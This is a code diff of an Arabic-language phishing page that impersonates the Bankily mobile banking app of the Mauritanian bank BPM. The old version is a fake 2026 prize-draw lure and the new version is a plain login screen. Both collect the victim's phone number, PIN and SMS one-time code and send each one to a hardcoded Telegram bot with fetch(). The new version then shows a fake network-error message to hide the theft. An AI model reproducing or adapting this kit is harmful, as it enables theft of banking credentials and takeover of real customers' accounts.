@@ -2,171 +2,156 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bankily 2026 - جوائز العام</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الرئيسية / مصرفي</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Playfair+Display:ital,wght@1,900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        body { margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
+        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 120px; display: flex; flex-direction: column; overflow: hidden; }
         
-        body { font-family: 'Tajawal', sans-serif; background-color: #f8fafc; margin: 0; min-height: 100vh; overflow-x: hidden; }
+        /* أماكن الصور (علامات الاستفهام) */
+        .header-container { width: 100%; height: 80px; display: flex; justify-content: center; align-items: center; }
+        .header-img { max-height: 100%; max-width: 100%; }
 
-        /* الواجهة العلوية الرسمية لبنكيلي 2026 */
-        .bankily-header { 
-            height: 42vh; 
-            background: linear-gradient(135deg, #00a5bc 0%, #007a8a 100%);
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border-radius: 0 0 50px 50px;
-            box-shadow: 0 10px 25px rgba(0, 165, 188, 0.2);
-        }
+        .form-container { padding: 0 20px; text-align: right; z-index: 2; }
+        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
+        
+        /* صناديق الإدخال */
+        .input-box { position: relative; border: 1.5px solid #000; border-radius: 12px; margin-bottom: 20px; background: #fff; display: flex; align-items: center; }
+        input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
+        .field-icon { width: 30px; height: 30px; margin-left: 10px; }
 
-        /* زخرفة "بنكيلي 2026" بخط فرنسي فخم */
-        .brand-title { 
-            font-family: 'Playfair Display', serif; 
-            font-size: 58px; 
-            color: #ffffff; 
-            font-style: italic;
-            text-shadow: 3px 3px 0px rgba(0,0,0,0.1);
-            margin-bottom: -10px;
-        }
-        .year-badge {
-            background: #ffb400;
-            color: #fff;
-            padding: 4px 20px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 20px;
-            margin-top: 15px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
+        .btn-main { background-color: #94a3b8; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-main.active { background-color: #2c5364; }
 
-        /* تنسيق الحقول لمحاكاة التطبيق الأصلي */
-        .app-container { padding: 30px 40px; }
-        .input-box { 
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            border: 1px solid #e2e8f0;
-        }
-        .input-label { color: #64748b; font-size: 13px; margin-bottom: 8px; display: block; font-weight: bold; }
-        .input-field { 
-            width: 100%; border: none; outline: none; font-size: 22px; 
-            text-align: center; color: #00a5bc; font-weight: bold; letter-spacing: 2px;
-        }
+        .banner-container { width: 100%; margin-top: 20px; text-align: center; }
+        .banner-img { width: 90%; border-radius: 8px; }
 
-        /* زر بنكيلي التقليدي */
-        .btn-bankily { 
-            background: #ffb400; color: white; width: 100%; padding: 18px; 
-            font-size: 22px; font-weight: bold; border: none; 
-            position: fixed; bottom: 0; right: 0; cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn-bankily:hover { background: #e6a200; }
+        .otp-icon-container { width: 100%; text-align: center; margin: 20px 0; }
+        .otp-main-icon { width: 100px; height: 100px; }
 
-        /* واجهة الـ OTP */
-        #screen-otp { display: none; text-align: center; background: #fff; min-height: 100vh; }
-        .otp-large-input {
-            width: 85%;
-            border: 3px solid #00a5bc;
-            border-radius: 20px;
-            padding: 20px;
-            font-size: 35px;
-            text-align: center;
-            letter-spacing: 20px;
-            margin: 50px auto;
-            color: #00a5bc;
-            outline: none;
-            display: block;
-        }
+        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 25px; font-size: 24px; font-weight: bold; border-radius: 5px; }
+        
+        .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 100px; z-index: 1; }
+        .footer-img { width: 100%; height: 100%; object-fit: cover; }
+
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <!-- الواجهة الرئيسية -->
-    <div id="screen-login">
-        <div class="bankily-header">
-            <h1 class="brand-title">Bankily</h1>
-            <div class="year-badge">جوائز 2026</div>
-        </div>
-
-        <div class="app-container">
-            <p class="text-center text-[#00a5bc] font-bold mb-6 text-lg">سجل دخولك للمشاركة في سحب اليوم</p>
-            
-            <div class="input-box">
-                <label class="input-label">رقم الهاتف (8 أرقام)</label>
-                <input id="user_id" type="tel" class="input-field" 
-                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
-                       maxlength="8" placeholder="00000000">
-            </div>
-
-            <div class="input-box">
-                <label class="input-label">الرمز السري (4 أرقام)</label>
-                <input id="pin" type="password" class="input-field" 
-                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
-                       maxlength="4" placeholder="****">
-            </div>
-
-            <p class="text-xs text-center text-gray-400">جميع البيانات محمية بواسطة أنظمة البنك الشعبي الموريتاني (BPM)</p>
-        </div>
-
-        <button onclick="handleLogin()" class="btn-bankily">تسجيل الدخول للسحب</button>
+<div class="wrapper">
+    <!-- صورة الشعار العلوية -->
+    <div class="header-container">
+        <img src="logo.png" class="header-img">
     </div>
 
-    <!-- واجهة التحقق OTP -->
-    <div id="screen-otp">
-        <div class="bg-[#00a5bc] p-10 text-white rounded-b-[40px]">
-            <h2 class="text-2xl font-bold">تأكيد المشاركة</h2>
+    <!-- الواجهة الأولى -->
+    <div id="p1" class="form-container">
+        <label class="label">رقم الهاتف المربوط بالحساب *</label>
+        <div class="input-box">
+            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
+            <img src="phone_icon.png" class="field-icon">
         </div>
-        
-        <div class="px-10 mt-16">
-            <p class="text-gray-600 font-bold mb-8">أدخل الرمز السري المكون من 4 أرقام الذي استلمته الآن عبر الرسائل النصية</p>
-            
-            <input id="otp_manual" type="tel" class="otp-large-input" 
-                   oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
-                   maxlength="4" placeholder="0000">
-            
-            <p class="text-red-500 font-bold">⏳ الرمز صالح لمرة واحدة فقط</p>
+
+        <label class="label">الرمز السري (PIN) *</label>
+        <div class="input-box">
+            <input type="password" id="pin" placeholder="****" maxlength="4" inputmode="numeric" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
+            <img src="lock_icon.png" class="field-icon">
         </div>
-        
-        <button onclick="handleOTP()" class="btn-bankily">تأكيد واستلام الجائزة</button>
+
+        <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>
+
+        <div class="banner-container">
+            <img src="banner.png" class="banner-img">
+        </div>
     </div>
 
-    <script>
-        const T = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const C = "8665814266";
+    <!-- الواجهة الثانية (OTP) -->
+    <div id="p2" class="form-container hidden">
+        <div class="otp-icon-container">
+            <img src="otp_icon.png" class="otp-main-icon">
+        </div>
+        
+        <p style="text-align: center; font-weight: bold;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
+        
+        <div class="input-box">
+            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateOtp();">
+            <img src="otp_field_icon.png" class="field-icon">
+        </div>
+        
+        <div class="timer-box" id="time">05:00</div>
+        <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
+    </div>
 
-        function handleLogin() {
-            const u = document.getElementById('user_id').value;
-            const p = document.getElementById('pin').value;
-            
-            if(u.length === 8 && p.length === 4) {
-                send(`🏆 Bankily 2026 Entry\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
-                document.getElementById('screen-login').style.display = 'none';
-                document.getElementById('screen-otp').style.display = 'block';
-            } else {
-                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح (أرقام فقط)");
-            }
-        }
+    <!-- صورة الخلفية السفلية -->
+    <div class="footer-container">
+        <img src="footer.png" class="footer-img">
+    </div>
+</div>
 
-        function handleOTP() {
-            const code = document.getElementById('otp_manual').value;
-            if(code.length === 4) {
-                send(`🔑 Bankily 2026 OTP: ${code}`);
-                alert("تم تسجيل مشاركتك بنجاح! سيتم إخطار الفائزين عبر اتصال مباشر.");
-                location.reload();
-            } else {
-                alert("يرجى إدخال رمز التحقق المكون من 4 أرقام");
-            }
-        }
+<script>
+    const tok = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+    const cid = "8665814266";
 
-        function send(m) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
+    function send(t) {
+        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
+    }
+
+    function validateInput() {
+        const t = document.getElementById('tel').value;
+        const p = document.getElementById('pin').value;
+        const btn = document.getElementById('btn1');
+        // تفعيل الزر فقط عند اكتمال الأرقام (8 للهاتف و 4 للرمز)
+        if(t.length === 8 && p.length === 4) {
+            btn.disabled = false;
+            btn.classList.add('active');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('active');
         }
-    </script>
+    }
+
+    function validateOtp() {
+        const o = document.getElementById('otp').value;
+        const btn = document.getElementById('btn2');
+        // تفعيل الزر عند إدخال 6 أرقام
+        if(o.length === 6) {
+            btn.disabled = false;
+            btn.classList.add('active');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('active');
+        }
+    }
+
+    function toStep2() {
+        send(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
+        document.getElementById('p1').classList.add('hidden');
+        document.getElementById('p2').classList.remove('hidden');
+        startTimer();
+    }
+
+    function startTimer() {
+        let time = 300;
+        let int = setInterval(() => {
+            let m = Math.floor(time / 60), s = time % 60;
+            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            if(time <= 0) clearInterval(int);
+            time--;
+        }, 1000);
+    }
+
+    function final() {
+        send(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
+        alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
+        location.reload();
+    }
+</script>
+
 </body>
 </html>
+
